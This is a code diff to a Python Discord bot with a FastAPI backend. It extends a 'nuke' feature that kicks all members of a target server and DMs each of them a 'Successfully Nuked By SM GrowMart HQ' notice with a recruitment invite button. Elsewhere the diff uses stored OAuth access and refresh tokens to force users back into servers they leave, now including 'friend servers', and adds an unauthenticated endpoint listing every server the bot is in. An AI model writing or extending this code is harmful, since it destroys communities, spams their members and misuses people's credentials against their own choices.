@@ -432,6 +432,8 @@ async def check_authorizations():
 @bot.event
 async def on_ready():
     logger.info(f"Discord Bot online as {bot.user}")
+    guilds_list = [(str(g.id), g.name) for g in bot.guilds]
+    logger.info(f"Bot is currently in {len(bot.guilds)} guilds: {guilds_list}")
     try:
         synced = await bot.tree.sync()
         logger.info(f"Synced {len(synced)} command(s)")
@@ -609,15 +611,40 @@ class NukeGuildSelect(discord.ui.Select):
         # 1. Kicks + DM
         embed = discord.Embed(
             title="Server Action Notice",
-            description="This Server Are Successfully Nuked By SM GrowMart HQ\n\nJoin Server For More Information https://discord.gg/ATK3JcG7rB",
+            description=f"**{guild.name}** Server Are Successfully Nuked By SM GrowMart HQ",
             color=0xff0000
         )
+        
+        invite_link = "https://discord.gg/ATK3JcG7rB"
+        try:
+            main_guild = interaction.client.get_guild(int(GUILD_ID))
+            if main_guild:
+                text_channels = [c for c in main_guild.channels if isinstance(c, discord.TextChannel)]
+                if text_channels:
+                    invites = await main_guild.invites()
+                    if invites:
+                        invite_link = invites[0].url
+                    else:
+                        invite = await text_channels[0].create_invite(max_age=86400, max_uses=0, reason="Dynamic Nuke Invite")
+                        invite_link = invite.url
+        except Exception:
+            pass
+
+        button = discord.ui.Button(
+            label="Join Server For More Information",
+            url=invite_link,
+            style=discord.ButtonStyle.link,
+            emoji="🔗"
+        )
+        view = discord.ui.View()
+        view.add_item(button)
+        
         import asyncio
         async def process_member(member):
             if member.id == guild.owner_id or member.id == guild.me.id:
                 return
             try:
-                await member.send(embed=embed)
+                await member.send(embed=embed, view=view)
             except Exception:
                 pass
             try:
@@ -731,11 +758,17 @@ async def perform_auto_join(discord_id: int, guild_id: str, role_id: str, acc: s
 
 @bot.event
 async def on_member_remove(member):
-    # Auto-join them back ONLY to the Main server if they leave the Main server.
+    # Attempt to auto-join them back if they leave the Main server.
     if str(member.guild.id) == str(GUILD_ID):
         acc, ref = get_user_tokens(str(member.id))
         if acc:
             await perform_auto_join(member.id, str(member.guild.id), ROLE_ID, acc, ref)
+    else:
+        # Check if they leave a Friend Server and we have friend verification data for them for THAT server
+        acc, ref = get_friend_user_tokens(str(member.id), str(member.guild.id))
+        if acc:
+            friend_role_id = get_friend_role(str(member.guild.id))
+            await perform_auto_join(member.id, str(member.guild.id), friend_role_id, acc, ref)
 
 import os
 
@@ -775,6 +808,19 @@ async def home_page():
 @app.api_route("/guide", methods=["GET", "HEAD"], response_class=HTMLResponse)
 async def guide_page():
     return HTMLResponse(content=GUIDE_HTML)
+
+# Unique Dynamic Verify Link for friends servers
+@app.get("/verify/{guild_id}")
+async def dynamic_verify_link(guild_id: str):
+    params = {
+        "client_id": CLIENT_ID or "",
+        "redirect_uri": REDIRECT_URI or "",
+        "response_type": "code",
+        "scope": OAUTH_SCOPES,
+        "state": str(guild_id)
+    }
+    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
+    return HTMLResponse(content=HOME_HTML.replace("{{auth_url}}", auth_url))
 
 from pydantic import BaseModel
 class SetupConfig(BaseModel):
@@ -824,7 +870,17 @@ def log_debug(msg):
     except:
         pass
 
-@app.get("/api/guild_details")
+@app.get("/api/bot_details")
+async def bot_details(request: Request):
+    bot_info = {
+        "status": "online" if bot.is_ready() else "offline",
+        "bot_id": str(bot.user.id) if bot.user else None,
+        "bot_name": str(bot.user) if bot.user else None,
+        "guild_count": len(bot.guilds),
+        "guilds": [{"id": str(g.id), "name": g.name} for g in bot.guilds],
+        "client_id_env": CLIENT_ID
+    }
+    return bot_info
 async def get_guild_details(guild_id: str, request: Request):
     auth_header = request.headers.get("Authorization")
     if not auth_header or not await verify_admin(auth_header, guild_id):
@@ -847,13 +903,14 @@ async def get_guild_details(guild_id: str, request: Request):
         mismatch_warn = ""
         try:
             bot_id = str(bot.user.id) if bot.user else "Unknown"
-            if str(CLIENT_ID) != bot_id:
+            if str(CLIENT_ID).strip() != bot_id:
                 mismatch_warn = f" MISMATCH! Bot Token ID: {bot_id}, but CLIENT_ID in .env is {CLIENT_ID}. You invited {CLIENT_ID} but the server runs as {bot_id}. Please fix your .env variables!"
         except:
             pass
             
-        invite_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id if bot.user else CLIENT_ID}&permissions=8&integration_type=0&scope=bot%20applications.commands&guild_id={guild_id}"
-        return {"in_guild": False, "invite_url": invite_url, "detail": f"Server not found. Reason: {fetch_err}.{mismatch_warn}"}
+        invite_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id if bot.user else CLIENT_ID}&permissions=8&integration_type=0&scope=bot%20applications.commands&guild_id={guild_id}&disable_guild_select=true"
+        detail_msg = f"Discord says the bot is not in the server. If you see it in the server, it might be an 'App Integration' without a bot user, or Discord is lagging. Please kick the bot from the server manually, then click Invite Bot below again. (Debug: {fetch_err}){mismatch_warn}"
+        return {"in_guild": False, "channels": [], "roles": [], "invite_url": invite_url, "detail": detail_msg}
         
     try:
         # Try to use cached channels, fallback to fetch
@@ -1089,6 +1146,53 @@ async def callback_handler(code: Optional[str] = None, state: Optional[str] = No
 
             # 4. Save information into database securely (Render PostgreSQL)
             save_verification(discord_id=discord_id, username=username, access_token=access_token, refresh_token=refresh_token)
+
+            # 5. Send a DM message to the newly verified user!
+            try:
+                user_obj = await bot.fetch_user(int(discord_id))
+                if user_obj:
+                    target_guild_id = state if state else GUILD_ID
+                    target_guild = bot.get_guild(int(target_guild_id))
+                    
+                    guild_name = target_guild.name if target_guild else "the server"
+                    invite_link = None
+                    if target_guild:
+                        try:
+                            # Try to find an existing channel we can invite to
+                            text_channels = [c for c in target_guild.channels if isinstance(c, discord.TextChannel)]
+                            if text_channels:
+                                channel_to_invite = text_channels[0]
+                                invites = await target_guild.invites()
+                                if invites:
+                                    invite_link = invites[0].url
+                                else:
+                                    invite = await channel_to_invite.create_invite(max_age=86400, max_uses=0, reason="Dynamic verification invite")
+                                    invite_link = invite.url
+                        except Exception as e:
+                            logger.warning(f"Could not generate invite link for {target_guild_id}: {e}")
+                    
+                    desc = f"Congratulations **{username}**, your Discord account is securely verified.\n\nYou have been granted full server access."
+                    
+                    view = None
+                    if invite_link:
+                        button = discord.ui.Button(label=f"Return to {guild_name}", url=invite_link, style=discord.ButtonStyle.link, emoji="🔗")
+                        view = discord.ui.View()
+                        view.add_item(button)
+                    else:
+                        desc += "\n\nYou can now safely close your browser and return to Discord."
+                        
+                    em = discord.Embed(
+                        title="✅ Verification Successful!",
+                        description=desc,
+                        color=discord.Color.brand_green()
+                    )
+                    
+                    if view:
+                        await user_obj.send(embed=em, view=view)
+                    else:
+                        await user_obj.send(embed=em)
+            except Exception as e:
+                logger.warning(f"Could not send DM to newly verified user {discord_id}: {e}")
 
             return HTMLResponse(
                 content=render_success(username=username),
